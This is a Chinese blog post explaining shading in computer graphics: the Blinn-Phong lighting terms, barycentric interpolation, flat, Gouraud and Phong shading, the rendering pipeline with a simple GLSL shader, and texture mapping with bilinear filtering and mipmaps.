<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/v2-1410d0150ffd0eb4207fb88f43e1b403_720w.jpg" alt="img" style="zoom: 67%;" loading="lazy">

<p>至此，我们得到了镜面反射的数值表示：<br>$$<br>L_s&#x3D;k_s(\frac{I}{r^2})max(0,cos\alpha)^p&#x3D;k_s(\frac{I}{r^2})max(0,v \cdot R)^p&#x3D;k_s(\frac{I}{r^2})max(0,n\cdot h)^p<br>$$<br>其中 $k_s$ 为镜面反射系数，$\frac{I}{r^2}$ 是当前点接受的光照强度，注意这里在max剔除大于90°的光之后，我们还乘了一个指数 $p$，添加该项的原因很直接，高光对于夹角的度数是十分敏感的，换句话说，只要观察方向稍微偏离反射方向，高光就会剧烈衰减，所以需要一个指数 $p$加速衰减，$p$ 越大，高光越小越聚集。图示可以明显看出 $p$ 对于加速高光衰减的效果。另外严格意义上说，镜面反射仍有接受光照能量的损失，在此为了简化不做考虑。</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200422212300315.png" alt="在这里插入图片描述" style="zoom:50%;" loading="lazy">

<p>下图中许多小球，展示了反射系数和 $p$ 值变动对高光反射效果的影响:</p>
<p><img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/v2-8fa8cf75866d26e9177b992145071066_720w.jpg" alt="img" loading="lazy"></p>
<h2 id="环境光（Ambient-lighting）"><a href="#环境光（Ambient-lighting）" class="headerlink" title="环境光（Ambient lighting）"></a>环境光（Ambient lighting）</h2><p>环境光也称间接光，是光线经过周围环境表面多次反射后形成的，利用它可以描述一块区域的亮度，在光照模型中，<strong>通常用一个常量来表示</strong>。<br>$$<br>L_a &#x3D; K_aI_a<br>$$<br>其中 $K_a$ 代表物体表面对环境光的反射率，$I_a$ 代表入射环境光的亮度，$L_{a}$ 表示人眼所能看到从物体表面反射的环境光的亮度。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，我们得到了Blinn-phong 光照模型的三个光照要素，整体的计算公式为：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/2020042221440294.png" alt="在这里插入图片描述" style="zoom: 67%;" loading="lazy">

<h1 id="重心坐标（Barycentric-Coordinates）"><a href="#重心坐标（Barycentric-Coordinates）" class="headerlink" title="重心坐标（Barycentric Coordinates）"></a>重心坐标（Barycentric Coordinates）</h1><p>本节不是在讨论着色吗，为什么会突然牵扯到重心坐标？</p>
<p>事实上，重心坐标对于求三角形内部的插值用于着色，以及对之后的纹理映射都是十分有帮助的。</p>
<h2 id="定义及说明"><a href="#定义及说明" class="headerlink" title="定义及说明"></a>定义及说明</h2><img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200411085222519.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>给定三角形的三点坐标 $A, B, C$ ，该平面内一点 $(x,y)$ 可以写成这三点坐标的线性组合形式，即 $(x,y) &#x3D; \alpha A+\beta B+ \gamma C$ 且满足 $\alpha + \beta + \gamma&#x3D;1$ ，则称此时3个坐标 $A,B,C$的权重 $\alpha, \beta ,\gamma$ 为点 $(x,y)$ 的重心坐标。特别的，三角形重心的重心坐标为$(\frac{1}{3},\frac{1}{3},\frac{1}{3})$。</p>
<p>说明：我们要保证 $\alpha, \beta ,\gamma$ 是非负的，这样才能确保点与三角形在同一平面内，而 $\alpha + \beta + \gamma&#x3D;1$ 是为了确保点在三角形内。这都是数学上的正确定义，在此不做深究。</p>
<p>运用上述公式我们并不能计算出一个点具体的重心坐标。如何定量呢？</p>
<p><img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/resize,p_60.png" alt="在这里插入图片描述" loading="lazy"></p>
<p>将一点 $(x,y)$ 与 $A,B,C$ 三点直接连接，构成三个三角形面积分别为 $A_A,A_B,A_C$ ，即可直接定义出重心坐标如图中公式所示。根据这条定义，我们只需求出各个三角形的面积便可以直接得出重心坐标了！</p>
<p>其实面积也是比较难算的，我们可以通过所求点和顶点的坐标等式转换为下面这个式子来求重心坐标（这仍是数学问题，不做深究）：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709103516804.png" alt="image-20220709103516804" style="zoom: 67%;" loading="lazy">

<h2 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h2><p>重心坐标在图形学中最重要的运用便是插值，它可以根据三个顶点 $A,B,C$的属性插值出任意点的属性，无论是位置，颜色，深度，法线向量等等，而这些属性在之后的着色或是消除隐藏曲面都有很大的作用。它还可以在处理光栅化问题中判断一个点是否在三角形内，利用重心坐标是否都大于0来代替之前的叉乘(其实二者一定程度上是等价的)。利用该条件来进行sample再判断是否画出该像素。</p>
<h1 id="着色方法-x2F-频率（shading-frequency）"><a href="#着色方法-x2F-频率（shading-frequency）" class="headerlink" title="着色方法&#x2F;频率（shading frequency）"></a>着色方法&#x2F;频率（shading frequency）</h1><p>上述光照模型主要利用了观察方向，入射光线与法线向量的位置关系进行公式上的推导。其中对于“着色点”（即引出法线的那个点）我们并没有过分强调，但这其实是十分重要的。“着色点”可以是一个面，也可以是顶点，也可以是像素，我们都可以对对应的“着色点”进行着色，如下图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709100925467.png" alt="image-20220709100925467" style="zoom:50%;" loading="lazy">

<p>在图形学中，我们称之为着色频率（面着色，顶点着色，像素着色），这3种不同的着色频率其实也就对应了三种不同方法。</p>
<h2 id="面着色（Flat-Shading）"><a href="#面着色（Flat-Shading）" class="headerlink" title="面着色（Flat Shading）"></a>面着色（Flat Shading）</h2><p>面着色，顾名思义以每一个面作为一个着色单位。前面我们说过三角形是最基础的多边形，所以实际模型数据中大多以很多个三角面进行存储，因此也就记录了每个三角形面的法线向量，利用每个面的法线向量进行一次Blinn-Phong反射光照模型的计算，<strong>将该颜色赋予整个面</strong>至整个物体，效果如下：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709101408214.png" alt="image-20220709101408214" style="zoom: 67%;" loading="lazy">

<p>Flat Shading 虽然计算很快，只需对每一个面进行一次着色计算，但是效果确是很差的，可以很明显的看到一块块面形状，因此不适用于光滑的物体平面。但当物体被细分成无数多的小三角形时，也会有较好的着色效果。</p>
<h2 id="顶点着色（Gouraud-Shading）"><a href="#顶点着色（Gouraud-Shading）" class="headerlink" title="顶点着色（Gouraud Shading）"></a>顶点着色（Gouraud Shading）</h2><p>Gouraud Shading会对每个三角形的顶点进行一次着色。我们只能容易得到每个面的法线向量，如何得到每个顶点的法线向量呢。做法其实很简单，将所有共享这个点的面的法线向量加起来求均值，最后再标准化就得到了该顶点的法线向量了。有了每个三角形的顶点向量之后，自然就可以计算出每个顶点的颜色了，那么对于三角形内部的每一个点应该怎么办呢（在面着色中，整个面都是同样的着色，所成的效果显然不好。而在点着色中，我们期望从三角形顶点到顶点之间内部呈现一个颜色渐变的状态，更自然也更符合常理）？对，就是利用上述所提到了重心坐标来插值了！公式如下：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709104139338.png" alt="image-20220709104139338" style="zoom: 50%;" loading="lazy">



<p>其中$V_A,V_B,V_C$ 代表三个顶点的颜色，$V$ 代表当前所求点， $\alpha, \beta ,\gamma$ 为点 $V$ 的重心坐标，我们只需将重心坐标与顶点颜色进行加权的相加计算即可得到所求点应该的颜色。</p>
<p>整体效果如下：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709104454400.png" alt="image-20220709104454400" style="zoom:67%;" loading="lazy">

<p>可以明显看出相对于Flat Shading，Gouraud Shading的效果有着明显的提升，但这样依然还不是最好的做法，因为我们实际上只对每个三角形顶点进行了着色，然后其它的颜色都是通过插值得到，有没有一种做法可以真正的对每个点用Blinn-Phong模型计算得出颜色呢？</p>
<h2 id="像素着色（Phong-Shading）"><a href="#像素着色（Phong-Shading）" class="headerlink" title="像素着色（Phong Shading）"></a>像素着色（Phong Shading）</h2><p>Phong Shading的做法其实也是很好理解的，既然要对每个点都进行光照计算，那么自然我们应该要有每个点的法线向量才可以。上述提到了如何得到每个顶点的法线向量，那么对于三角形内部的每一个点的法线向量自然也可以像插值颜色一般得到：<br>$$<br>n &#x3D; \alpha n_0+\beta n_1+ \gamma n_2<br>$$<br>其中 $n_0,n_1,n_2$ 分别是三角形三个顶点的法线向量，$\alpha,\beta,\gamma$ 为三角形面内一点的重心坐标，$n$ 为该点插值之后得到的法线向量。如此便得到了任意一点的法线向量了，也当然可以对任意一点进行Blinn-Phong模型的计算了。最终渲染效果如下：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709110428403.png" alt="image-20220709110428403" style="zoom:67%;" loading="lazy">

<p>可以明显看出Phong Shading对于高光的显示相比于Gouraud Shading是更真实的。</p>
<p>模型精度的提升，各种shading type又会有怎样的区别呢：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200428174542497.png" alt="img" style="zoom: 80%;" loading="lazy">

<h1 id="图形-x2F-实时渲染管线（Graphics-x2F-Real-time-Pipeline）"><a href="#图形-x2F-实时渲染管线（Graphics-x2F-Real-time-Pipeline）" class="headerlink" title="图形&#x2F;实时渲染管线（Graphics&#x2F;Real time Pipeline）"></a>图形&#x2F;实时渲染管线（Graphics&#x2F;Real time Pipeline）</h1><p>所谓图形&#x2F;实时渲染管线指的是一系列操作的流程，这个流程具体来说就是将一堆具有三维几何信息的数据点最终转换到二维屏幕空间的像素。其实也就是将之前的所有知识连贯起来。以如下图作为一个总结，再具体分步骤讲解：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200502173825768.png" alt="img" style="zoom:67%;" loading="lazy">

<p>首先来看第一个，顶点处理：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200502174119814.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>顶点处理的作用是指对所有的顶点数据进行Model，View和Projection（MVP）的变换，最终得到投影到二维平面的坐标信息（同时为了Zbuffer保留深度z）。<br>而第二步三角形处理也十分容易理解，就是将所有的顶点按照原几何信息，变成三角面，每个面由3个顶点组成。得到了许许多多个三角形之后，接下来的操作自然就是三角形光栅化了：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200502175449751.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>在进行完三角形的光栅化之后，知道了哪些在三角形内的点可以被显示，那么如何确定每个像素点或者说片元（Fragement）的颜色呢？</p>
<p>自然是着色了，也就是片元处理阶段应该做的：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200502175936945.png" alt="img" style="zoom:67%;" loading="lazy">

<p>注意这阶段顶点处理也亮起来是因为我们需要顶点信息对三角形内的点进行属性插值（tips：当然也可以直接在顶点处理阶段就算出每个顶点的颜色值，如Gouraud Shading一样）。当然这一阶段也少不了Z-Buffer来帮助确定，哪些像素点应该显示在屏幕上，哪些点被遮挡了不应该显示：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200502180406976.png" alt="img" style="zoom:67%;" loading="lazy">

<p>最后一步Framebuffer的处理，就是将所有的像素颜色信息整合在一起，输送给显示设备加以显示。这也就完成了整个图形渲染管线了。</p>
<h2 id="shader"><a href="#shader" class="headerlink" title="shader"></a>shader</h2><p>shader称作着色器，分为顶点着色器（vertex shader）以及片元&#x2F;像素着色器（fragment&#x2F;pixel shader），主要用于上述渲染管线的 vertex processing阶段以及fragment processing阶段，程序员可以自行编程来代替原来固定的顶点处理和片元处理从而达到各种各样令人惊叹的效果！这也就是现在的可编程渲染管线。</p>
<p>一个简单的像素着色器的 phong模型漫反射：</p>
<pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token keyword">uniform</span> <span class="token keyword">sampler2D</span> myTexture<span class="token punctuation">;</span>            <span class="token comment">//全局变量  纹理</span>
<span class="token keyword">uniform</span> <span class="token keyword">vec3</span> lightDir<span class="token punctuation">;</span>                  <span class="token comment">//全局变量  光照方向</span>
<span class="token keyword">varying</span> <span class="token keyword">vec2</span> uv<span class="token punctuation">;</span>                        <span class="token comment">//纹理图坐标</span>
<span class="token keyword">varying</span> <span class="token keyword">vec3</span> norm<span class="token punctuation">;</span>                      <span class="token comment">//每个着色点法线坐标</span>
<span class="token keyword">void</span> <span class="token function">diffuseShader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">vec3</span> kd<span class="token punctuation">;</span>                            <span class="token comment">//漫反射系数</span>
	kd <span class="token operator">=</span> <span class="token function">texture2d</span><span class="token punctuation">(</span>myTexture<span class="token punctuation">,</span> uv<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//通过纹理图找到每个点的漫反射系数</span>
	kd <span class="token operator">*=</span> <span class="token function">clamp</span><span class="token punctuation">(</span><span class="token function">dot</span><span class="token punctuation">(</span><span class="token operator">-</span>lightDir<span class="token punctuation">,</span> norm<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//计算漫反射光照</span>
	gl FragColor <span class="token operator">=</span> <span class="token keyword">vec4</span><span class="token punctuation">(</span>kd<span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//返回值</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="纹理映射（Texture-Mapping）"><a href="#纹理映射（Texture-Mapping）" class="headerlink" title="纹理映射（Texture Mapping）"></a>纹理映射（Texture Mapping）</h1><p>先来观察这么一张图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200505104332358.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>无论是球上的图案，以及地板的木头纹理都呈现出了不同的颜色信息，那么回想在讲解Blinn-Phong反射模型的时候曾提到，一个点的颜色是由其漫反射系数决定的，反射什么颜色的光，人眼就能看见什么颜色。针对上面这幅图，难道要去对每一个点自己去设定一个颜色吗？</p>
<p>我们可以将三维物体上的任意一个点都映射到一个2维平面之上，再来看一个地球仪的例子：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200505105021289.png" alt="img" style="zoom:50%;" loading="lazy">

<p>倘若拥有从3维World space到2维Texture space的一个映射关系，那么只需要将每个点的颜色信息即漫反射系数存储在2维的Texture之上，每次利用光照模型进行计算的时候根据映射关系就能查到这个点的漫反射系数是多少，所有点计算完之后，结果就像最左边的screen space之中，<strong>整个Texture被贴在了模型之上</strong>。</p>
<p>以下是百科对纹理映射的解释：</p>
<blockquote>
<p>纹理映射（Texture Mapping），又称纹理贴图，是将纹理空间中的纹理像素映射到屏幕空间中的像素的过程。简单来说，就是把一幅图像贴到三维物体的表面上来增强真实感，可以和光照计算、图像混合等技术结合起来形成许多非常漂亮的效果。</p>
</blockquote>
<p>有了Texture，有了映射关系，对渲染结果会有一个非常大提升，因为很多fancy的效果都可以通过texture的设计得到（当然这属于美术的活儿了，咱们用就行了）。来看一个独眼巨人：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200505110147754.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>通过将 texture 贴到独眼巨人模型上，可见它更加生动形象了（更丑了…）</p>
<p>到目前为止，我们考虑一下做了些什么：在将物体光栅化映射到二维屏幕之后，需要考虑着色问题，我们运用 Blinn-phong 光照模型对每一个像素进行着色，如何考虑着色过程中的漫反射系数，就是通过纹理映射得到。<strong>确切的说，纹理映射不仅仅是用来得到漫反射系数的，可以通过它得到着色点的各个属性。</strong></p>
<p>那么有了一张Texture之后，这种纹理到模型的映射关系究竟是如何表示的呢？这就要从纹理坐标 $（UV）$ 说起了。在纹理空间之内任意一个二维坐标都在 $[0,1]$ 之内。如下图是一个可视化纹理坐标的结果:</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/202005051106125.png" alt="img" style="zoom: 40%;" loading="lazy">

<p>横轴和纵轴的最大值都为1，一幅Texture上的任意一点都可以用一个 $(u,v)$ 坐标来表示 $(0&lt;&#x3D;u&lt;&#x3D;1,0&lt;&#x3D;v&lt;&#x3D;1)$，因此只需要在三维world space中每个顶点的信息之中存储下该顶点在texture space的 $(u,v)$ 坐标信息，自然而然的就直接的得到了这种映射关系。</p>
<p>一个纹理坐标使用的伪代码供参考:<br><img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/2020050511512114.png" alt="img" style="zoom:50%;" loading="lazy"><br>简而言之就是对每个光栅化的屏幕坐标算出它的 $uv$ 坐标（利用三角形顶点重心坐标插值），再利用这个 $uv$ 坐标去查询 texture上的颜色，把这个颜色信息当作漫反射系数 $K_d$。</p>
<h2 id="纹理过小带来的问题"><a href="#纹理过小带来的问题" class="headerlink" title="纹理过小带来的问题"></a>纹理过小带来的问题</h2><p>纹理过小的问题相对容易理解，想想我们把一张 $100<em>100$ 的纹理贴图应用在一 $500</em>500$ 的屏幕之上，必然要对纹理进行方法，这就会导致走样失真，因为屏幕空间的几个像素点对应在纹理贴图的坐标上都是集中在一个像素大小之内。那么如果仅仅是使用对应 $(u,v)$ 坐标在texture贴图下最近的那个像素点，往往会造成严重的走样。</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/2020050608353039.png" alt="img" style="zoom: 40%;" loading="lazy">

<p>如图中红色点是屏幕空间下一像素所对应在texture空间中的点，因为它没有精确的对应 texture 中的像素点，如果去选择离它最近的那个橙色框起来的点，那必然会导致走样。如下图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709145728560.png" alt="image-20220709145728560" style="zoom:50%;" loading="lazy">



<h2 id="双线性插值（Bilinear-Interpolation）"><a href="#双线性插值（Bilinear-Interpolation）" class="headerlink" title="双线性插值（Bilinear Interpolation）"></a>双线性插值（Bilinear Interpolation）</h2><p>如何改善走样？利用双线性插值。</p>
<p>我们依然取上图的点作为例子。第一步，取出离红色点最近的4个黑色顶点，分别算出该红色点在水平及竖直方向偏移的比率 $s,t$，图示如下：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506084023345.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>接着先利用 $s$，可以线性插值出如下图所示的 $u_0，u_1$ 点的颜色值：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506084240768.png" alt="img" style="zoom: 67%;" loading="lazy">

<p>接着利用 $t$ ，颜色值 $u_0，u_1$ 插值出红色点的颜色值：<br>$$<br>f(x,y)&#x3D;lerp(t,u_0,u_1)<br>$$<br>如此这样利用两次线性插值，综合考虑到了所有4个点的颜色值，能够很好的缓解走样失真现象，并且计算速度较高。效果如图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709150217113.png" alt="image-20220709150217113" style="zoom:50%;" loading="lazy">

<h2 id="纹理过大带来的问题"><a href="#纹理过大带来的问题" class="headerlink" title="纹理过大带来的问题"></a>纹理过大带来的问题</h2><p>可能对于我们的第一直觉来说，纹理小确实会引发问题，但是纹理大那不是更好吗，为什么会引发问题呢？但事实是纹理过大所引发的走样甚至会更加严重。想象一张很大的地板，在上面铺满了重复的方格贴图，我们所期望看到的结果应该是这样的： </p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/image-20220709150421960.png" alt="image-20220709150421960" style="zoom:50%;" loading="lazy">

<p>这符合透视投影近大远小，不过这是标准答案。如果此时纹理过大，采用采样着色之后的效果是这样的：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506085624666.png" alt="img" style="zoom:50%;" loading="lazy">

<p>不堪入目，近处锯齿，远处摩尔纹，非常严重的走样现象，为什么会导致这样的一个现象呢？这是我的理解：</p>
<p><strong>地板上铺满了重复的方格贴图，根据近大远小，远处的一张完整的贴图可能在屏幕空间中仅仅是几个像素的大小，那么必然屏幕空间的一个像素对应了纹理贴图上的一片范围的点，这其实就是纹理过大所导致的，直观来说想用一个点采样的结果代替纹理空间一片范围的颜色信息，必然会导致严重走样！就是前面所说的采样导致的走样本质：采样频率跟不上信号频率</strong></p>
<p>（tips：为什么1个屏幕空间像素点覆盖多个纹理空间像素就是纹理过大呢，想象一下纹理贴图大小 $500<em>500$，屏幕空间 $100</em>100$，将屏幕空间的像素点均匀分布在纹理空间之中，那么1个屏幕空间像素点所占的平均大小就是 $5*5&#x3D;25$ 个纹理空间像素，因此这就是纹理过大所导致的结果）</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506091239348.png" alt="img" style="zoom:50%;" loading="lazy">

<p>上图就是一个很好的例子，一个屏幕空间的蓝色像素点离相机越远，对应在texture空间的范围也就越大。其实也就是越来越缺少采样，那么一种直观的解决方法就是 Supersampling，如果一个像素点不足以代表一个区域的颜色信息，那么便把一个像素细分为更多个小的采样点不就可以解决这个问题了吗？确实是这样，可以看看如下图超采样的结果：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506091740823.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>效果虽称不上完美但也极大缓解了走样现象，但问题是什么？计算量太大了，一个像素点被分为了 $512*512$ 个采样点，计算量几乎多出了25万倍！这显然不是所希望看到的。换一种想法，如果不去超采样，仅仅是求出每个屏幕像素里所有texels的颜色均值呢？</p>
<h2 id="Mipmap"><a href="#Mipmap" class="headerlink" title="Mipmap"></a>Mipmap</h2><p>正如上文所提，一个采样点的颜色信息不足以代表 texture 里一个区域的颜色信息，如果可以求出这样一个区域里面所有颜色的均值，是不是就是一种可行的方法呢？没错，我们的目标就是<strong>从点查询 Point Query 迈向区域查询 Range Query</strong>。但依然存在一个问题，不同的屏幕像素所对应的纹理区域是不一样大小的，即离相机远的像素点必然会对应很大一片纹理区域，看下图这样一个例子：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506153055179.png" alt="img" style="zoom:50%;" loading="lazy">

<p>远处圆圈里的对应的纹理区域必然比近处的要大，因此必须要准备不同等级（level）的区域查询才可以，而这正是Mipmap。</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506153245604.png" alt="img" style="zoom:50%;" loading="lazy">

<p>Level 0代表的是原始 texture，也是精度最高的纹理，随着 Level 的提升，每提升一级将4个相邻像素点求均值合为一个像素点，因此越高的 Level 也就代表了更大的纹理的区域查询。接下来要做的就是根据屏幕像素的大小选定不同 Level 的 texture，再进行点查询即可，而这其实就相当于在原始texture上进行了区域查询！</p>
<p>那么如何去确定使用哪个 Level 的 texture呢？利用屏幕像素的相邻像素点估算纹理大小再确定 Level 。如下图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506153927727.png" alt="img" style="zoom:50%;" loading="lazy">

<p>在屏幕空间中取当前像素点的右方和上方的两个相邻像素点（4个全取也可以），分别查询得到这3个点对应在Texture space的坐标，计算出当前像素点与右方像素点和上方像素点在Texture space的距离，<strong>二者取最大值</strong>，计算公式如图中所示。<strong>那么 Level D就是这个距离的$log_2$值 ($ D &#x3D; log_2L$)</strong> 。这不难理解，可以具体取几个例子比如L &#x3D; 1，L &#x3D; 2，L &#x3D; 4，看看是否符合这样的计算即可。</p>
<p>但是这里D值算出来是一个连续值，并不是一个整数，有两种对应的方法：</p>
<p><strong>1. 四舍五入取得最近的那个Level D</strong><br><strong>2. 利用D值在向下和向上取整的两个不同 Level 进行3线性插值</strong></p>
<p>第一个方法很容易理解，具体讲述一下第二个方法，如图：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/2020050615484625.png" alt="img" style="zoom: 50%;" loading="lazy">

<p>所谓3线性插值，就是在向下取整的 Level D上进行一次双线性插值（前文提过），再在 Level D+1之上进行一次双线性插值，这二者数据再根据实际的连续D值在向下和向上取整的两个不同 Level 之间的比例，再来一次线性插值，而这整体就是一个三线性插值了。</p>
<p>根据上述的方法算出屏幕上每一个像素点所对应的Mipmap level，再进行三线性插值得到颜色值，是否就能很好的解决走样问题了呢？很遗憾，在本文的那个地板的例子之中，费了这么大力气依然不能完美解决，如下图结果：</p>
<img src="/2022/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6%E5%9B%9B%EF%BC%9A%E7%9D%80%E8%89%B2-Shading/20200506155505241.png" alt="img" style="zoom:50%;" loading="lazy">

